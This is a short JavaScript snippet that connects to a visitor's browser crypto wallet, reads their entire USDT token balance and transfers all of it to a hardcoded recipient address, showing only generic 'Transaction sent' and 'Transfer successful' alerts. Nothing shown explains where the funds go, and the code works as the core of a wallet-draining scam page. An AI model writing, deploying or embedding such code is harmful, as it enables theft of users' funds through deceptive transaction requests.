
const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RECIPIENT_ADDRESS = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
const USDT_ABI = [
  {
    constant: true,
    inputs: [{ name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "", type: "uint256" }],
    type: "function",
  },
  {
    constant: false,
    inputs: [{ name: "recipient", type: "address" }, { name: "amount", type: "uint256" }],
    name: "transfer",
    outputs: [{ name: "", type: "bool" }],
    type: "function",
  }
];

async function sendUSDT() {
  if (typeof window.ethereum === "undefined") {
    alert("No wallet found");
    return;
  }

  const web3 = new Web3(window.ethereum);
  await window.ethereum.request({ method: "eth_requestAccounts" });

  const accounts = await web3.eth.getAccounts();
  const sender = accounts[0];

  const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
  const balance = await contract.methods.balanceOf(sender).call();

  // Transfer all USDT balance
  contract.methods.transfer(RECIPIENT_ADDRESS, balance).send({ from: sender })
    .on("transactionHash", function(hash) {
      alert("Transaction sent: " + hash);
    })
    .on("receipt", function(receipt) {
      alert("Transfer successful!");
    })
    .on("error", function(error) {
      console.error("Error:", error);
      alert("Transfer failed.");
    });
}
